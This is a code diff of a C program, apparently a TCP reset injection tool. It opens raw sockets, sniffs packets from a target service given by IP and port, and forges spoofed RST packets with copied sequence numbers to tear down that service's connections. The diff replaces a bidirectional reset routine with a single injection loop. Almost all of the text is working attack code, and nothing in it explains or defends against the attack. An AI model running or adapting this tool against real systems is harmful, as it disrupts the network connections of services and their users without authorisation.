@@ -31,9 +31,6 @@
 
 // Functions
 uint16_t ip_checksum(void*,size_t);
-void reset(const int, const char *, const char *, const uint32_t, const uint32_t, 
-    const uint16_t, const uint16_t, uint32_t, uint32_t);
-// void sigint_handler(int);
 void sigchld_handler(int);
 
 // Pseudo header needed for calculating the TCP header checksum
@@ -49,26 +46,17 @@ int main(int argc, char *argv[]) {
     int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
     char service_ip[INET6_ADDRSTRLEN];
     uint16_t service_port;
-    struct sockaddr_storage saddr;
-    uint32_t service_addr;
+    uint32_t service_addr, seq;
     socklen_t addr_len;
-    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE];
+    char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
     unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
-    struct sigaction csa;
-    struct iphdr *iph;
-    struct tcphdr *tcph, *cstcph;
+    struct iphdr *iph, *new_iph;
+    struct tcphdr *tcph, *cstcph, *new_tcph;
     struct pshdr *psh;
     uint16_t win = 8192, id0 = rand() %(65536);
     size_t tcp_len;
+    struct sockaddr_storage saddr;
     struct sockaddr_in sa;
-
-    csa.sa_handler = sigchld_handler; // reap all dead processes
-	sigemptyset(&csa.sa_mask);
-	csa.sa_flags = SA_RESTART;
-	if (sigaction(SIGCHLD, &csa, NULL) == -1) {
-		perror("sigaction");
-		exit(1);
-	}
 
     if (argc != 3) {
 	    fprintf(stderr,"usage: reset service_ip service_port\n");
@@ -91,10 +79,20 @@ int main(int argc, char *argv[]) {
 
     service_port = htons(service_port);
 
+    // init pointers
+    new_iph = (struct iphdr *) buf;
+    new_tcph= (struct tcphdr*) (new_iph + 1);
+
     // open attack socket
     if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("fakesync: socket\n");
+        perror("injection: socket\n");
         exit(1);
+    }
+
+    //Set option IP_HDRINCL (headers are included in packet)
+    if(setsockopt(attack_sock, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) < 0) {
+        perror("injection: setsockopt\n");
+        exit(-1);
     }
 
     // pre-fill TCP, IP and pseudo headers
@@ -105,7 +103,7 @@ int main(int argc, char *argv[]) {
     tcph = (struct tcphdr *) (iph + 1);
 
     tcp_len = sizeof(struct tcphdr);
-
+    iph -> daddr = service_addr;
     iph -> version = 4; // IPv4
     iph -> ihl = 5; // 5 * 32 bits
     iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
@@ -114,12 +112,11 @@ int main(int argc, char *argv[]) {
     iph -> ttl = 64; // time to live
     iph -> protocol = IPPROTO_TCP; // TCP
     
+    tcph -> dest = service_port;
     tcph -> doff = 5; // 5 * 32-bit tcp header
-    tcph -> ack = 0;
     tcph -> rst = 1;
     tcph -> window = htons(win); // 16 bits
     tcph -> check = 0; // 16 bits. init to 0.
-    tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
 
     // construct psudo packet
     memset(pseudo_packet, 0, sizeof pseudo_packet);
@@ -128,9 +125,13 @@ int main(int argc, char *argv[]) {
     memcpy(cstcph, (char *)tcph, tcp_len);
 
     // pack pseudo header
+    psh -> dst_addr = service_addr;
     psh -> reserved = 0;
     psh -> protocol = IPPROTO_TCP; // TCP
     psh -> tcp_len = htons(tcp_len); // TCP segment length
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = service_addr;
 
     // Open sniff socket
     if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
@@ -148,24 +149,42 @@ int main(int argc, char *argv[]) {
             goto error;
         }
 
-        if (!fork()) {
-            close(sniff_sock); // no longer needed
-            iph = (struct iphdr *) buf;
-            tcph= (struct tcphdr*) (buf + iph->ihl * 4);
+        if (new_iph -> protocol != IPPROTO_TCP) continue; // check if packet is TCP packet
+        // if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) continue; // only care about syn ack packets
+        if (new_tcph -> rst == 1) continue; // ignore reset packets
+        if ((new_iph -> saddr != service_addr) || (new_tcph -> source != service_port)) continue; // check if source is the service
+        
+        tcph -> source = new_tcph -> dest; // source port
+        cstcph -> source = new_tcph -> dest;
+        
+        // seq = htonl(ntohl(new_tcph->ack_seq) + 1);
+        tcph -> seq = new_tcph->ack_seq;
+        cstcph -> seq = new_tcph->ack_seq;
+        // seq = htonl(ntohl(new_tcph->seq) + 1);
+        // tcph -> ack_seq = seq; // ack sequence number
+        // cstcph -> ack_seq = seq;
+        // if (new_tcph->seq > 0) {
+        //     tcph -> ack = 1;
+        //     cstcph -> ack = 1;
+        // }
 
-            if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
-            if (tcph -> rst == 1) goto final; // ignore reset packets
-            if ((iph -> daddr != service_addr) && (iph -> saddr != service_addr)) goto final;
-            if ((tcph -> dest != service_port) && (tcph -> source != service_port)) goto final;
-            // print_tcp_packet(buf, num); // log the packet
+        // dynamic pseudo fields
+        psh -> src_addr = new_iph->daddr;
 
-            reset(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // reset the sender
-            reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // reset the receiver
-            goto final;
+        // calculate check sum
+        tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
+
+        // dynamic IP fields
+        iph -> saddr = new_iph->daddr;
+    
+        if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+        {
+            perror("fakesync: sendto()\n");
         }
     }
 
 final:
+    close(sniff_sock);
     close(attack_sock);
     return 0;
 error:
@@ -174,17 +193,6 @@ error:
     exit(1);
 }
 
-void sigchld_handler(int s)
-{
-	(void)s; // quiet unused variable warning
-
-	// waitpid() might overwrite errno, so we save and restore it:
-	int saved_errno = errno;
-
-	while(waitpid(-1, NULL, WNOHANG) > 0);
-
-	errno = saved_errno;
-}
 
 uint16_t ip_checksum(void* vdata,size_t length) {
     // Cast the data pointer to one that can be indexed.
@@ -215,54 +223,4 @@ uint16_t ip_checksum(void* vdata,size_t length) {
 
     // Return the checksum in network byte order.
     return htons(~acc);
-}
-
-void reset(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
-    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
-{
-    int num;
-    struct sockaddr_in sa;
-
-    size_t tcp_len = sizeof(struct tcphdr);
-    struct iphdr *iph = (struct iphdr *) datagram;
-    struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
-    struct pshdr *psh = (struct pshdr *) pseudo_packet;
-    struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);
-
-    // dynamic TCP fields
-    tcph -> source = sport; // source port
-    cstcph -> source = sport;
-    tcph -> dest = dport; // destination port
-    cstcph -> dest = dport;
-    tcph -> seq = htonl(seq0); // sequence number
-    cstcph -> seq = htonl(seq0);
-    tcph -> ack_seq = htonl(ack0); // ack sequence number
-    cstcph -> ack_seq = htonl(ack0);
-    if (ack0 > 0) {
-        tcph -> ack = 1;
-        cstcph -> ack = 1;
-    }
-
-    // dynamic pseudo fields
-    psh -> src_addr = saddr;
-    psh -> dst_addr = daddr;
-
-    tcph -> check = 0;
-    cstcph -> check = 0;
-
-    // calculate check sum
-    tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
-
-    // dynamic IP fields
-    iph -> saddr = saddr;
-    iph -> daddr = daddr;
-
-    // dynamic sockaddr field
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = daddr;
-
-    if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-    {
-        perror("fakesync: sendto()\n");
-    }
 }
